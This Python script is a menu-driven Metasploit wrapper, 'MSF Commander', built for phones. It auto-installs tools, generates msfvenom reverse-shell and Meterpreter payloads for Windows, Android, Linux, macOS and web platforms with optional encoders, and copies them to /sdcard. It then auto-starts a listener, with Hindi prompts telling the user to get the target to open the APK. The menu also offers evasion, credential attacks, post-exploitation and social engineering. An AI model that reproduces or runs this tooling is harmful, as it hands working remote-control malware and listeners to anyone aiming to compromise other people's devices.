#!/usr/bin/env python3
"""
MSF Commander v4.0 - Mobile Friendly
Auto-detects Metasploit, installs deps, moves payloads to /sdcard
"""

import os
import sys
import subprocess
import time
import shutil
from pathlib import Path

# ═══════════════════════════════════════════════════════════════
#  TOOL DETECTOR
# ═══════════════════════════════════════════════════════════════

MSF_PATHS = [
    "/storage/emulated/0/Hacking tools list/metasploit_tool/msfconsole",
    # Original paths below
    
    os.path.expanduser("~/metasploit-framework/msfconsole"),
    "/opt/metasploit-framework/bin/msfconsole",
    "/usr/bin/msfconsole",
    "/usr/local/bin/msfconsole",
]

def find_tool(name):
    path = shutil.which(name)
    if path:
        return path
    for p in MSF_PATHS:
        if "msfconsole" in name and p and os.path.exists(p) and os.access(p, os.X_OK):
            return p
    common = {
        "msfvenom": ["/root/metasploit-framework/msfvenom", "/opt/metasploit-framework/bin/msfvenom", "/usr/bin/msfvenom"],
        "nmap": ["/usr/bin/nmap"], "sqlmap": ["/usr/bin/sqlmap", "/usr/share/sqlmap/sqlmap.py"],
        "hydra": ["/usr/bin/hydra"], "john": ["/usr/bin/john"], "nikto": ["/usr/bin/nikto"],
        "gobuster": ["/usr/bin/gobuster"], "dirb": ["/usr/bin/dirb"],
        "setoolkit": ["/usr/bin/setoolkit"], "enum4linux": ["/usr/bin/enum4linux"],
        "smbclient": ["/usr/bin/smbclient"], "wpscan": ["/usr/bin/wpscan"],
    }
    for p in common.get(name, []):
        if p and os.path.exists(p):
            return p
    return None

def get_msf_path():
    return find_tool("msfconsole") or "msfconsole"

def get_msfvenom_path():
    return find_tool("msfvenom") or "msfvenom"

# ═══════════════════════════════════════════════════════════════
#  AUTO INSTALL ALL DEPENDENCIES
# ═══════════════════════════════════════════════════════════════

def pip_install(pkg):
    subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--break-system-packages"], capture_output=True, timeout=120)
    return True

def apt_install(pkg):
    subprocess.run(["apt-get", "install", "-y", pkg], capture_output=True, timeout=300)
    return True

def auto_install_all():
    _R = "\033[0m"; _G = "\033[32m"; _Y = "\033[33m"; _C = "\033[36m"; _B = "\033[1m"
    
    print(f"\n{'='*50}")
    print(f"  ⚡ AUTO-INSTALL: Checking dependencies...")
    print(f"{'='*50}\n")
    
    installed = 0
    
    # Python packages
    print(f"  {_C}{_B}📦 Python:{_R}")
    for mod, pkg in {"colorama": "colorama", "requests": "requests"}.items():
        try:
            __import__(mod)
            print(f"    ✅ {pkg}")
        except ImportError:
            print(f"    ⏳ {pkg}...", end="", flush=True)
            pip_install(pkg)
            print(f" ✅")
            installed += 1
    
    # System packages
    print(f"\n  {_C}{_B}📦 System:{_R}")
    for pkg in ["nmap", "sqlmap", "hydra", "curl", "wget", "git", "ruby"]:
        if find_tool(pkg):
            print(f"    ✅ {pkg}")
        else:
            print(f"    ⏳ {pkg}...", end="", flush=True)
            apt_install(pkg)
            print(f" ✅")
            installed += 1
    
    # Metasploit
    print(f"\n  {_C}{_B}📦 Metasploit:{_R}")
    msf_ok = find_tool("msfconsole")
    if not msf_ok:
        print(f"    ⏳ Installing via apt...", flush=True)
        subprocess.run("apt-get update -y 2>/dev/null", shell=True, capture_output=True)
        subprocess.run("apt-get install -y metasploit-framework 2>/dev/null", shell=True)
        msf_ok = find_tool("msfconsole")
        
        if not msf_ok:
            print(f"    ⏳ Trying git clone...", flush=True)
            msf_dir = os.path.expanduser("~/metasploit-framework")
            if not os.path.exists(msf_dir):
                subprocess.run(f"git clone https://github.com/rapid7/metasploit-framework.git {msf_dir} 2>/dev/null", shell=True, timeout=300)
            if os.path.exists(f"{msf_dir}/msfconsole"):
                subprocess.run(f"cd {msf_dir} && bundle install 2>/dev/null", shell=True, timeout=600)
                msf_ok = find_tool("msfconsole")
        
        if msf_ok:
            print(f"    ✅ Metasploit installed!")
            subprocess.run("msfdb init 2>/dev/null", shell=True)
            installed += 1
        else:
            print(f"    ❌ Install failed - manual: https://www.metasploit.com/download")
    else:
        print(f"    ✅ Metasploit found: {msf_ok}")
    
    print(f"\n{'='*50}")
    print(f"  ✅ Done! {installed} new packages installed")
    print(f"{'='*50}\n")

# ──── Run auto-install FIRST ────
auto_install_all()

# ═══════════════════════════════════════════════════════════════
#  IMPORT DEPENDENCIES
# ═══════════════════════════════════════════════════════════════

from colorama import Fore, Style, init
init(autoreset=True)

R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; B = Fore.BLUE
M = Fore.MAGENTA; C = Fore.CYAN; W = Fore.WHITE
D = Style.DIM; BRIGHT = Style.BRIGHT; RESET = Style.RESET_ALL

# ═══════════════════════════════════════════════════════════════
#  MOBILE-FRIENDLY HELPERS
# ═══════════════════════════════════════════════════════════════

SDCARD_PATH = "/sdcard"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def box(title, icon="⚔️"):
    """Mobile-friendly box header - compact"""
    print()
    print(f"{R}{BRIGHT}  ┌{'─'*46}┐{RESET}")
    print(f"{R}{BRIGHT}  │{RESET}  {G}{BRIGHT}{icon}  {Y}{BRIGHT}{title}{RESET}  {R}{BRIGHT}{' '*(43-len(title))}│{RESET}")
    print(f"{R}{BRIGHT}  └{'─'*46}┘{RESET}")
    print()

def success(msg):
    print(f"  {G}{BRIGHT}  ✅ {msg}{RESET}")

def error(msg):
    print(f"  {R}{BRIGHT}  ❌ {msg}{RESET}")

def info(msg):
    print(f"  {C}{BRIGHT}  ➜ {msg}{RESET}")

def warning(msg):
    print(f"  {Y}{BRIGHT}  ⚠ {msg}{RESET}")

def cmd_result(label, value):
    print(f"  {M}{BRIGHT}  ◆{B}{label}:{RESET} {G}{BRIGHT}{value}{RESET}")

def section_header(title, icon="⚔️"):
    return box(title, icon)

def move_to_sdcard(filepath):
    """Auto-move payload to /sdcard/"""
    if not os.path.exists(filepath):
        return False
    sdcard = SDCARD_PATH
    if not os.path.exists(sdcard):
        sdcard = "/storage/emulated/0"
    if not os.path.exists(sdcard):
        info(f"Payload at: {filepath}")
        return False
    dest = os.path.join(sdcard, os.path.basename(filepath))
    try:
        shutil.copy2(filepath, dest)
        success(f"Moved to {dest}")
        return True
    except:
        info(f"Payload at: {filepath}")
        return False

def run_cmd(cmd, show_output=True):
    try:
        # Suppress Ruby gem warnings for msf tools
        if "msf" in cmd.lower():
            cmd = f'RUBYOPT="-W0" {cmd}'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
        if show_output:
            # Filter out Ruby gem warnings
            stdout = result.stdout or ""
            stdout = "\n".join(l for l in stdout.split('\n') if not l.strip().startswith("WARN:"))
            if stdout.strip():
                for line in stdout.strip().split('\n')[:30]:
                    print(f"  {W}{line}{RESET}")
            stderr = result.stderr or ""
            stderr = "\n".join(l for l in stderr.split('\n') if not l.strip().startswith("WARN:"))
            if stderr.strip() and result.returncode != 0:
                for line in stderr.strip().split('\n')[:5]:
                    print(f"  {Y}{line}{RESET}")
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        error("Command timed out (300s)")
        return False
    except Exception as e:
        error(f"Error: {str(e)[:50]}")
        return False

def get_user_input(prompt, default=""):
    val = input(f"  {C}{BRIGHT}{prompt}{RESET}").strip()
    return val if val else default

def yes_no(prompt):
    val = input(f"  {Y}{BRIGHT}{prompt} (y/n): {RESET}").strip().lower()
    return val in ['y', 'yes', '']

def loading_bar(text="Loading", duration=2):
    emojis = ["🔍","📡","💻","🌐","🔒","⚔️"]
    bar_len = 25
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        prog = i % (bar_len + 1)
        filled = "█" * prog
        empty = "░" * (bar_len - prog)
        pct = int((prog / bar_len) * 100)
        emoji = emojis[i % len(emojis)]
        print(f"\r{C}{BRIGHT}  {emoji} [{G}{filled}{C}{empty}] {pct}% {text}...{RESET}  ", end="", flush=True)
        time.sleep(0.08)
        i += 1
    print(f"\r{G}{BRIGHT}  ✅ [{'█'*bar_len}] 100% Done!{RESET}                          ")

def check_all_tools():
    box("TOOL DETECTOR", "🔍")
    tools = {
        "msfconsole": "Metasploit", "msfvenom": "MSFVenom",
        "nmap": "Nmap", "sqlmap": "SQLMap", "hydra": "Hydra",
        "john": "John", "curl": "cURL", "wget": "Wget",
        "git": "Git", "ruby": "Ruby", "python3": "Python3",
        "nikto": "Nikto", "gobuster": "Gobuster", "dirb": "Dirb",
        "setoolkit": "SET", "enum4linux": "Enum4linux", "smbclient": "SMBClient",
    }
    found = 0
    for cmd, name in tools.items():
        path = find_tool(cmd)
        if path:
            found += 1
            print(f"    {G}✅ {name:18}{RESET} {D}→ {path}{RESET}")
        else:
            print(f"    {R}❌ {name:18}{RESET} Not found")
    print(f"\n  {G}Found: {found}/{len(tools)} tools{RESET}\n")

def generate_rc_and_run(commands, name="attack"):
    msf = get_msf_path()
    rc_file = f"/tmp/{name}.rc"
    with open(rc_file, 'w') as f:
        for cmd in commands:
            f.write(cmd + "\n")
    info(f"Script: {rc_file}")
    os.system('RUBYOPT="-W0" ' + msf + ' -r ' + rc_file)

# ═══════════════════════════════════════════════════════════════
#  PAYLOAD GENERATOR
# ═══════════════════════════════════════════════════════════════

def msfvenom_generate():
    clear()
    box("PAYLOAD GENERATOR", "💣")
    msfv = get_msfvenom_path()
    info(f"Using: {msfv}")
    
    print(f"""
  {M}[1]{RESET} Windows EXE     {M}[9]{RESET}  Windows Shell    {M}[17]{RESET} Mac Macho
  {M}[2]{RESET} Windows DLL     {M}[10]{RESET} Windows HTTPS    {M}[18]{RESET} PHP Meterp
  {M}[3]{RESET} Windows MSI     {M}[11]{RESET} Windows Bind     {M}[19]{RESET} Python Meterp
  {M}[4]{RESET} Windows HTA     {M}[12]{RESET} Linux ELF        {M}[20]{RESET} Ruby Meterp
  {M}[5]{RESET} Windows PS1     {M}[13]{RESET} Linux Python     {M}[21]{RESET} Perl Meterp
  {M}[6]{RESET} Windows VBA     {M}[14]{RESET} Linux Shell      {M}[22]{RESET} Node.js Meterp
  {M}[7]{RESET} Windows XML     {M}[15]{RESET} Linux HTTPS      {M}[23]{RESET} Java JAR
  {M}[8]{RESET} Windows EXE     {M}[16]{RESET} Android APK      {M}[24]{RESET} WAR/ASPX/JSP
""")
    
    choice = get_user_input("Select [1-24]: ")
    lhost = get_user_input("LHOST (your IP): ", "0.0.0.0")
    lport = get_user_input("LPORT (port): ", "4444")
    output = get_user_input("Filename: ", "payload")
    encoder = get_user_input("Encoder (blank=none): ", "")
    
    payload_map = {
        "1": ("windows/x64/meterpreter/reverse_tcp", f"{output}.exe"),
        "2": ("windows/x64/meterpreter/reverse_tcp", f"{output}.dll"),
        "3": ("windows/x64/meterpreter/reverse_tcp", f"{output}.msi"),
        "4": ("windows/x64/meterpreter/reverse_http", f"{output}.hta"),
        "5": ("windows/x64/meterpreter/reverse_tcp", f"{output}.ps1"),
        "6": ("windows/x64/meterpreter/reverse_tcp", f"{output}.vba"),
        "7": ("windows/x64/meterpreter/reverse_tcp", f"{output}.xml"),
        "8": ("windows/x64/meterpreter/reverse_tcp", f"{output}.exe"),
        "9": ("windows/shell_reverse_tcp", f"{output}.exe"),
        "10": ("windows/x64/meterpreter/reverse_https", f"{output}.exe"),
        "11": ("windows/x64/meterpreter/bind_tcp", f"{output}.exe"),
        "12": ("linux/x64/meterpreter/reverse_tcp", f"{output}.elf"),
        "13": ("linux/x64/meterpreter/reverse_tcp", f"{output}.py"),
        "14": ("linux/x64/shell_reverse_tcp", f"{output}.elf"),
        "15": ("linux/x64/meterpreter/reverse_https", f"{output}.elf"),
        "16": ("android/meterpreter/reverse_tcp", f"{output}.apk"),
        "17": ("osx/x64/meterpreter/reverse_tcp", f"{output}.macho"),
        "18": ("php/meterpreter/reverse_tcp", f"{output}.php"),
        "19": ("python/meterpreter/reverse_tcp", f"{output}.py"),
        "20": ("ruby/meterpreter/reverse_tcp", f"{output}.rb"),
        "21": ("perl/meterpreter/reverse_tcp", f"{output}.pl"),
        "22": ("nodejs/meterpreter/reverse_tcp", f"{output}.js"),
        "23": ("java/meterpreter/reverse_tcp", f"{output}.jar"),
        "24": ("java/jsp_shell_reverse_tcp", f"{output}.war"),
    }
    
    if choice in payload_map:
        payload, filename = payload_map[choice]
    elif choice == "33":
        payload = get_user_input("Custom payload: ")
        filename = f"{output}.bin"
    else:
        error("Invalid choice!")
        return
    
    fmt_map = {"1":"exe","2":"dll","3":"msi","4":"hta","5":"ps1","6":"vba","7":"xml",
               "8":"exe","9":"exe","10":"exe","11":"exe","12":"elf","13":"raw",
               "14":"elf","15":"elf","16":"raw","17":"macho","18":"raw","19":"raw",
               "20":"raw","21":"raw","22":"raw","23":"jar","24":"war"}
    fmt = fmt_map.get(choice, "raw")
    
    cmd = f"{msfv} -p {payload} LHOST={lhost} LPORT={lport}"
    if encoder:
        cmd += f" -e {encoder}"
    cmd += f" -f {fmt} -o /root/{filename}"
    
    info(f"Payload: {payload}")
    info(f"Output: /root/{filename}")
    print()
    loading_bar("Generating", 3)
    print()
    
    success_status = run_cmd(cmd)
    if success_status:
        success(f"Payload: /root/{filename}")
        move_to_sdcard(f"/root/{filename}")
        
        # Auto-generate handler .rc file
        handler_rc = f"/tmp/handler_{output}.rc"
        with open(handler_rc, 'w') as f:
            f.write(f"use exploit/multi/handler\n")
            f.write(f"set payload {payload}\n")
            f.write(f"set LHOST {lhost}\n")
            f.write(f"set LPORT {lport}\n")
            f.write(f"set ExitOnSession false\n")
            f.write(f"exploit -j\n")
        success(f"Handler: {handler_rc}")
        
        print()
        info("⚠️  LISTENER CHALANA MAT BHOOLNA!")
        print(f"  {Y}APK install karne se pehle listener start karo:{RESET}")
        print(f"  {G}{BRIGHT}  Option A: Auto-start (ye tool karega){RESET}")
        print(f"  {G}{BRIGHT}  Option B: Manual - msfconsole -r {handler_rc}{RESET}")
        print()
        
        if yes_no("Abhi listener start karein?"):
            msf = get_msf_path()
            info(f"Starting handler: {msf} -r {handler_rc}")
            print(f"  {Y}Target se APK open karo - connection aayega!{RESET}")
            print()
            os.system(f"RUBYOPT=\"-W0\" {msf} -r {handler_rc}")
    else:
        error("Generation failed!")

def start_listener():
    """Quick listener starter"""
    clear()
    box("START LISTENER", "📡")
    
    print(f"""  {M}[1]{RESET}  Android Meterpreter
  {M}[2]{RESET}  Windows x64 Meterpreter
  {M}[3]{RESET}  Windows x86 Meterpreter
  {M}[4]{RESET}  Linux x64 Meterpreter
  {M}[5]{RESET}  PHP Meterpreter
  {M}[6]{RESET}  Custom payload
""")
    
    choice = get_user_input("Select [1-6]: ")
    
    payload_map = {
        "1": "android/meterpreter/reverse_tcp",
        "2": "windows/x64/meterpreter/reverse_tcp",
        "3": "windows/meterpreter/reverse_tcp",
        "4": "linux/x64/meterpreter/reverse_tcp",
        "5": "php/meterpreter/reverse_tcp",
    }
    
    if choice in payload_map:
        payload = payload_map[choice]
    elif choice == "6":
        payload = get_user_input("Payload: ")
    else:
        error("Invalid!")
        return
    
    lhost = get_user_input("LHOST (your IP): ", "0.0.0.0")
    lport = get_user_input("LPORT: ", "4444")
    
    handler_rc = f"/tmp/quick_handler.rc"
    with open(handler_rc, 'w') as f:
        f.write(f"use exploit/multi/handler\n")
        f.write(f"set payload {payload}\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        f.write(f"set ExitOnSession false\n")
        f.write(f"exploit -j\n")
    
    info(f"Handler: {handler_rc}")
    info(f"Payload: {payload}")
    info(f"LHOST: {lhost} LPORT: {lport}")
    print()
    print(f"  {G}{BRIGHT}  Target se payload run karo - connection aayega!{RESET}")
    print()
    
    msf = get_msf_path()
    os.system(f"RUBYOPT=\"-W0\" {msf} -r {handler_rc}")

def msfvenom_list_payloads():
    clear()
    box("ALL PAYLOADS", "📋")
    run_cmd(f"{get_msfvenom_path()} --list payloads 2>/dev/null | head -80")

def msfvenom_list_encoders():
    clear()
    box("ALL ENCODERS", "🔐")
    run_cmd(f"{get_msfvenom_path()} --list encoders 2>/dev/null")

def msfvenom_list_formats():
    clear()
    box("OUTPUT FORMATS", "📄")
    run_cmd(f"{get_msfvenom_path()} --list formats 2>/dev/null")

# ═══════════════════════════════════════════════════════════════
#  MAIN MENU
# ═══════════════════════════════════════════════════════════════

def banner():
    clear()
    print(f"""
{G}{BRIGHT}
   ╔═══════════════════════════════════╗
   ║   ███╗   ███╗██╗   ██╗██████╗    ║
   ║   ████╗ ████║╚██╗ ██╔╝██╔══██╗   ║
   ║   ██╔████╔██║ ╚████╔╝ ██████╔╝   ║
   ║   ██║╚██╔╝██║  ╚██╔╝  ██╔══██╗   ║
   ║   ██║ ╚═╝ ██║   ██║   ██████╔╝   ║
   ║   ╚═╝     ╚═╝   ╚═╝   ╚═════╝   ║
   ╠═══════════════════════════════════╣
   ║  ⚔️  MSF COMMANDER v4.0  ⚔️      ║
   ║  Mobile Friendly Edition         ║
   ╚═══════════════════════════════════╝{RESET}
""")
    msf_path = find_tool("msfconsole")
    if msf_path:
        success(f"Metasploit: {msf_path}")
    else:
        warning("Metasploit: Not found - Run [1] Setup!")

def main_menu():
    while True:
        print(f"""
{R}{BRIGHT}  ┌──────────────────────────────────────┐
  │        ⚔️  MAIN MENU  ⚔️              │
  ├──────────────────────────────────────┤{RESET}
{Y}  │{M}[1]{Y}  Setup & Install                  │{Y}
  │{M}[2]{Y}  MSF Console                       │{Y}
  │{M}[3]{Y}  Payload Generator + Listener      │{Y}
  │{M}[4]{Y}  Start Listener Only               │{Y}
  │{M}[5]{Y}  List Payloads/Encoders            │{Y}
  │{M}[6]{Y}  Network Exploits                  │{Y}
  │{M}[7]{Y}  Client-Side Exploits              │{Y}
  │{M}[8]{Y}  Local Exploits (PrivEsc)          │{Y}
  │{M}[9]{Y}  Auxiliary (Scan/Fuzz/DoS)         │{Y}
  │{M}[10]{Y} Web Attacks                       │{Y}
  │{M}[11]{Y} Credential Attacks                │{Y}
  │{M}[12]{Y} Post-Exploitation                 │{Y}
  │{M}[13]{Y} Evasion & Encoding                │{Y}
  │{M}[14]{Y} Pivoting & Tunneling              │{Y}
  │{M}[15]{Y} Mobile Exploits                   │{Y}
  │{M}[16]{Y} Database Attacks                  │{Y}
  │{M}[17]{Y} Social Engineering                │{Y}
  │{M}[18]{Y} Meterpreter Commands              │{Y}
  │{M}[19]{Y} Reporting & Export                │{Y}
  │{M}[20]{Y} Resource Script Builder           │{Y}
  │{M}[21]{Y} Tool Detector                     │{Y}
{R}{BRIGHT}  ├──────────────────────────────────────┤
  │{R}[0]{Y}  Exit                               │{R}
  └──────────────────────────────────────┘{RESET}""")
        
        choice = input(f"\n{G}{BRIGHT}  └──╼ [{M}0-21{G}]: {RESET}").strip()
        
        if choice == "1":
            clear()
            from setup import setup_menu
            setup_menu()
        elif choice == "2":
            clear()
            msf = get_msf_path()
            info(f"Launching: {msf}")
            os.system('RUBYOPT="-W0" ' + msf)
        elif choice == "3":
            msfvenom_generate()
        elif choice == "4":
            start_listener()
        elif choice == "5":
            msfvenom_list_payloads()
        elif choice == "6":
            clear()
            from exploits import network_exploits
            network_exploits()
        elif choice == "7":
            clear()
            from exploits import client_exploits
            client_exploits()
        elif choice == "8":
            clear()
            from exploits import local_exploits
            local_exploits()
        elif choice == "9":
            clear()
            from auxiliary import auxiliary_menu
            auxiliary_menu()
        elif choice == "10":
            clear()
            from web_hacking import web_hacking_menu
            web_hacking_menu()
        elif choice == "11":
            clear()
            from cred_attacks import cred_attacks_menu
            cred_attacks_menu()
        elif choice == "12":
            clear()
            from post_exploit import post_exploit_menu
            post_exploit_menu()
        elif choice == "13":
            clear()
            from encoders_evasion import evasion_menu
            evasion_menu()
        elif choice == "14":
            clear()
            from pivoting import pivoting_menu
            pivoting_menu()
        elif choice == "15":
            clear()
            from exploits import mobile_exploits
            mobile_exploits()
        elif choice == "16":
            clear()
            from exploits import database_attacks
            database_attacks()
        elif choice == "17":
            clear()
            from exploits import social_engineering
            social_engineering()
        elif choice == "18":
            clear()
            from meterpreter_cmds import meterpreter_menu
            meterpreter_menu()
        elif choice == "19":
            clear()
            from reporting import reporting_menu
            reporting_menu()
        elif choice == "20":
            clear()
            from resource_builder import resource_builder_menu
            resource_builder_menu()
        elif choice == "21":
            clear()
            check_all_tools()
        elif choice == "0":
            print(f"\n  {R}{BRIGHT}  ⚔️ Goodbye! Stay Ethical! ⚔️{RESET}\n")
            sys.exit(0)
        else:
            error("Invalid! Select 0-21.")
        
        input(f"\n{D}  Press Enter...{RESET}")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    try:
        banner()
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n  {R}Interrupted!{RESET}\n")
        sys.exit(0)
